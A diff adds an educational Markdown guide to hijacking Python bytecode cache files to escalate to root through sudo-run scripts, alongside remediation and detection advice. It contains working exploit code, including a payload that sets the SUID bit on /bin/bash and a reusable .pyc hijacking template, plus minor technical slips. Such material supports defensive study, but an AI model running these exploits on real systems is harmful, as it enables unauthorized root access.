@@ -1,0 +1,520 @@
+# Python Bytecode Cache (.pyc) Privilege Escalation ..beta..
+
+## Overview
+
+This document explains how misconfigured Python bytecode cache directories can lead to privilege escalation when combined with sudo permissions on Python scripts.
+
+## Background: Python Bytecode Caching
+
+### What are .pyc files?
+
+Python caches compiled bytecode in `.pyc` files to improve import performance. When you import a module, Python:
+
+1. **Lexes** the source code
+2. **Parses** into an Abstract Syntax Tree (AST)
+3. **Compiles** AST into bytecode
+4. **Caches** bytecode in `__pycache__/` directory
+5. **Executes** the bytecode in the Python VM
+
+### Cache Structure
+
+```
+project/
+├── main.py
+├── utils.py
+└── __pycache__/
+    └── utils.cpython-312.pyc
+```
+
+When `main.py` imports `utils`, Python creates `utils.cpython-312.pyc` to avoid recompiling on subsequent runs.
+
+## The .pyc File Format
+
+### Python 3.7+ Format
+
+```
++---------------------+
+|   magic (4 bytes)   |  ← Python version identifier
+|---------------------|
+|   flags (4 bytes)   |  ← Compilation flags (hash/size based)
+|---------------------|
+| timestamp (4 bytes) |  ← Source file modification time
+|   size (4 bytes)    |  ← Source file size (or hash)
+|---------------------|
+|                     |
+|      bytecode       |  ← Marshal-serialized code object
+|      (n bytes)      |
+|                     |
++---------------------+
+```
+
+### Cache Invalidation
+
+Python recompiles and overwrites the cache when:
+- Source file timestamp changes
+- Source file size changes
+- Source file content hash changes
+- Python version changes (magic number mismatch)
+- Compilation flags differ
+- Optimization level changes
+
+**Critical:** If none of these change, Python uses the cached `.pyc` file **without checking the source**.
+
+## The Vulnerability
+
+### Scenario
+
+A system has:
+1. A Python script that can be run with sudo
+2. The script imports custom modules
+3. The `__pycache__` directory has weak permissions
+
+### Example Configuration
+
+```bash
+# Script runnable as root
+$ sudo -l
+(root) NOPASSWD: /opt/app/manager.py
+
+# Directory permissions
+$ ls -la /opt/app/
+drwxr-xr-x  3 root root 4096 __pycache__    ← Root owned
+drwxrwxrwx  2 root root 4096 __pycache__    ← VULNERABLE!
+
+# The target script
+$ cat /opt/app/manager.py
+#!/usr/bin/python3
+from utils import validate_input  # ← Imports custom module
+# ... rest of code
+```
+
+### Why This is Exploitable
+
+1. **Writable cache directory** allows deleting/creating `.pyc` files
+2. **Sudo execution** runs our code as root
+3. **Import caching** executes our bytecode instead of source
+4. **No source check** if cache appears valid
+
+## Exploitation Process
+
+### Step 1: Trigger Cache Creation
+
+```bash
+# Run the script once to generate .pyc files
+$ sudo /opt/app/manager.py --help
+
+# Verify cache exists
+$ ls -la /opt/app/__pycache__/
+-rw-r--r-- 1 root root 1523 utils.cpython-312.pyc
+```
+
+### Step 2: Extract Original Header
+
+```python
+#!/usr/bin/env python3
+import struct
+
+pyc_file = "/opt/app/__pycache__/utils.cpython-312.pyc"
+
+with open(pyc_file, 'rb') as f:
+    magic = f.read(4)      # Python version magic
+    flags = f.read(4)      # Compilation flags  
+    timestamp = f.read(8)  # Timestamp + size/hash
+
+print(f"Magic:  {magic.hex()}")
+print(f"Flags:  {flags.hex()}")
+print(f"Header: {(magic + flags + timestamp).hex()}")
+```
+
+### Step 3: Create Malicious Bytecode
+
+```python
+#!/usr/bin/env python3
+import marshal
+import os
+
+# Read original header
+with open(pyc_file, 'rb') as f:
+    magic = f.read(4)
+    flags = f.read(4)
+    timestamp = f.read(8)
+
+# Malicious payload
+payload = '''
+import os
+
+# Privilege escalation
+os.system("chmod +s /bin/bash")
+
+# IMPORTANT: Preserve original module functions
+# to avoid ImportError when script runs
+
+def validate_input(data):
+    """Original function - must exist"""
+    return True
+
+def process_data(data):
+    """Original function - must exist"""
+    return data
+
+# Add all other functions from original module...
+'''
+
+# Compile to bytecode
+code = compile(payload, "utils.py", "exec")
+bytecode = marshal.dumps(code)
+
+# Remove old cache (read-only)
+os.remove(pyc_file)
+
+# Write hijacked cache
+with open(pyc_file, 'wb') as f:
+    f.write(magic)       # Preserve Python version
+    f.write(flags)       # Preserve compilation flags
+    f.write(timestamp)   # Keep original timestamp/size
+    f.write(bytecode)    # Our malicious code
+
+print(f"[+] Hijacked {pyc_file}")
+```
+
+### Step 4: Trigger Execution
+
+```bash
+# Run the script with sudo - imports our hijacked module
+$ sudo /opt/app/manager.py --some-argument
+
+# Our payload executes as root during import
+[+] SUID bit set on /bin/bash
+
+# Verify privilege escalation
+$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1396520 /bin/bash
+
+# Get root shell
+$ /bin/bash -p
+bash-5.2# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+```
+
+## Why This Works
+
+### The Import Flow
+
+```python
+# When manager.py runs as root:
+from utils import validate_input
+
+# Python checks:
+1. Is utils.pyc in cache? ✓ Yes
+2. Is magic number valid? ✓ Yes (we preserved it)
+3. Has source changed? ✗ Skipped (flags=0, no hash check)
+4. Is timestamp fresh? ✓ Yes (we preserved it)
+
+# Python decides: Use cached bytecode
+# Our malicious code runs as root!
+```
+
+### Key Insight
+
+Python trusts the cache when:
+- Magic number matches Python version
+- Flags indicate no hash checking (set to `0x00000000`)
+- Timestamp/size appear unchanged
+- No source validation needed
+
+## Defense Mechanisms
+
+### For System Administrators
+
+**1. Proper Permissions:**
+```bash
+# Cache directories should not be world-writable
+chmod 755 /opt/app/__pycache__
+chown root:root /opt/app/__pycache__
+
+# Verify recursively
+find /opt -type d -name "__pycache__" -exec chmod 755 {} \;
+```
+
+**2. Audit Sudo Permissions:**
+```bash
+# Avoid giving sudo to Python scripts with imports
+# Use compiled binaries or wrapper scripts instead
+
+# BAD:
+(root) NOPASSWD: /opt/app/script.py
+
+# BETTER:
+(root) NOPASSWD: /usr/local/bin/app-wrapper
+# Where wrapper is a compiled binary or shell script
+```
+
+**3. Use Hash-Based Validation:**
+```python
+# Force hash-based .pyc validation
+import py_compile
+py_compile.compile('module.py', invalidation_mode='checked-hash')
+```
+
+**4. Disable Bytecode Caching:**
+```bash
+# Run Python with -B flag
+python3 -B script.py
+
+# Or set environment variable
+export PYTHONDONTWRITEBYTECODE=1
+```
+
+**5. File Integrity Monitoring:**
+```bash
+# Monitor __pycache__ directories
+auditctl -w /opt/app/__pycache__/ -p wa -k pyc_tampering
+
+# Alert on suspicious .pyc modifications
+```
+
+### For Developers
+
+**1. Don't Store Code in World-Writable Locations:**
+```python
+# BAD:
+/tmp/myapp/
+/var/tmp/scripts/
+
+# GOOD:
+/opt/myapp/  (root:root, 755)
+/usr/local/lib/myapp/  (root:root, 755)
+```
+
+**2. Validate Imports in Critical Scripts:**
+```python
+import hashlib
+import sys
+
+def verify_module_integrity():
+    """Check if imported modules match expected hashes"""
+    expected = {
+        'utils': 'abc123def456...',
+        'helpers': 'fed654cba321...'
+    }
+    
+    for module_name, expected_hash in expected.items():
+        module = sys.modules.get(module_name)
+        if module and hasattr(module, '__file__'):
+            with open(module.__file__, 'rb') as f:
+                actual_hash = hashlib.sha256(f.read()).hexdigest()
+            if actual_hash != expected_hash:
+                raise ImportError(f"Module {module_name} integrity check failed!")
+
+# Call before executing privileged operations
+verify_module_integrity()
+```
+
+**3. Use Virtual Environments with Proper Permissions:**
+```bash
+# Create venv with restrictive permissions
+python3 -m venv /opt/app/venv
+chmod -R 755 /opt/app/venv
+chown -R root:root /opt/app/venv
+```
+
+## Detection Techniques
+
+### Identify Writable Cache Directories
+
+```bash
+# Find all __pycache__ directories
+find / -type d -name "__pycache__" 2>/dev/null
+
+# Find world-writable ones
+find / -type d -name "__pycache__" -perm -0002 2>/dev/null
+
+# Check ownership mismatches
+find /opt /usr/local -type d -name "__pycache__" ! -user root 2>/dev/null
+```
+
+### Analyze Sudo Configurations
+
+```bash
+# Check for Python scripts in sudoers
+grep -r "\.py" /etc/sudoers /etc/sudoers.d/
+
+# List all sudo-capable Python scripts
+sudo -l | grep "\.py"
+```
+
+### Inspect .pyc Files for Tampering
+
+```python
+#!/usr/bin/env python3
+import marshal
+import dis
+import sys
+
+def inspect_pyc(pyc_path):
+    """Disassemble .pyc to detect suspicious operations"""
+    
+    with open(pyc_path, 'rb') as f:
+        # Skip header
+        f.read(16)  # magic + flags + timestamp + size
+        
+        # Load code object
+        code = marshal.load(f)
+    
+    # Disassemble to readable bytecode
+    print(f"\n[*] Analyzing: {pyc_path}")
+    print("=" * 60)
+    dis.dis(code)
+    
+    # Look for suspicious patterns
+    bytecode_str = dis.Bytecode(code).dis()
+    
+    suspicious = [
+        'os.system',
+        'subprocess',
+        'chmod',
+        'chown',
+        '/bin/bash',
+        'LOAD_NAME.*eval',
+        'LOAD_NAME.*exec',
+    ]
+    
+    for pattern in suspicious:
+        if pattern in str(bytecode_str):
+            print(f"\n[!] WARNING: Suspicious pattern found: {pattern}")
+    
+if __name__ == "__main__":
+    inspect_pyc(sys.argv[1])
+```
+
+Usage:
+```bash
+python3 inspect_pyc.py /opt/app/__pycache__/utils.cpython-312.pyc
+```
+
+## Real-World Impact
+
+### CVSS Metrics (Hypothetical)
+
+```
+CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
+
+Base Score: 8.8 (High)
+
+- Attack Vector: Local
+- Attack Complexity: Low
+- Privileges Required: Low (writable directory)
+- User Interaction: None
+- Scope: Changed (escalate to root)
+- Confidentiality: High
+- Integrity: High  
+- Availability: High
+```
+
+### Attack Prerequisites
+
+1. ✓ Local access to system
+2. ✓ Writable `__pycache__` directory
+3. ✓ Sudo permission on Python script that imports modules
+4. ✓ Ability to trigger script execution
+
+### Remediation Priority
+
+**Critical** if:
+- Production systems with sudo Python scripts
+- Multi-user environments
+- Web applications running Python with elevated privileges
+
+**High** if:
+- Development systems with sensitive data
+- Scripts processing untrusted input
+- Automated tasks running as root
+
+## Proof of Concept Template
+
+```python
+#!/usr/bin/env python3
+"""
+Python Bytecode Cache Hijacking PoC
+Usage: python3 poc.py <target.pyc>
+"""
+
+import marshal
+import os
+import sys
+
+def hijack_pyc(pyc_path, payload_code):
+    """
+    Hijack a .pyc file with malicious bytecode
+    
+    Args:
+        pyc_path: Path to target .pyc file
+        payload_code: Python code to inject (string)
+    """
+    
+    # Read original header
+    with open(pyc_path, 'rb') as f:
+        magic = f.read(4)
+        flags = f.read(4)
+        timestamp = f.read(8)
+    
+    print(f"[*] Original header:")
+    print(f"    Magic:     {magic.hex()}")
+    print(f"    Flags:     {flags.hex()}")
+    print(f"    Timestamp: {timestamp.hex()}")
+    
+    # Compile payload
+    print(f"[*] Compiling payload...")
+    code = compile(payload_code, os.path.basename(pyc_path)[:-1], "exec")
+    bytecode = marshal.dumps(code)
+    
+    # Write hijacked cache
+    print(f"[*] Removing old cache...")
+    os.remove(pyc_path)
+    
+    print(f"[*] Writing hijacked cache...")
+    with open(pyc_path, 'wb') as f:
+        f.write(magic)
+        f.write(flags)
+        f.write(timestamp)
+        f.write(bytecode)
+    
+    print(f"[+] Successfully hijacked {pyc_path}")
+    print(f"[+] Payload size: {len(bytecode)} bytes")
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <target.pyc>")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    
+    # Example payload - customize as needed
+    payload = '''
+import os
+print("[+] Malicious code executed!")
+os.system("id")
+
+# Remember to preserve original functions
+def original_function():
+    pass
+'''
+    
+    hijack_pyc(target, payload)
+```
+
+## Additional Resources
+
+- [PEP 552 - Deterministic pycs](https://peps.python.org/pep-0552/)
+- [Python Import System Documentation](https://docs.python.org/3/reference/import.html)
+- [Python Marshal Module](https://docs.python.org/3/library/marshal.html)
+- [Python Bytecode Instructions](https://docs.python.org/3/library/dis.html)
+
+## Disclaimer
+
+This document is for educational purposes only. Unauthorized access to computer systems is illegal. Only test on systems you own or have explicit permission to test.
+
+---
+
+**Last Updated:** January 2026  
+**Python Versions Tested:** 3.8, 3.9, 3.10, 3.11, 3.12
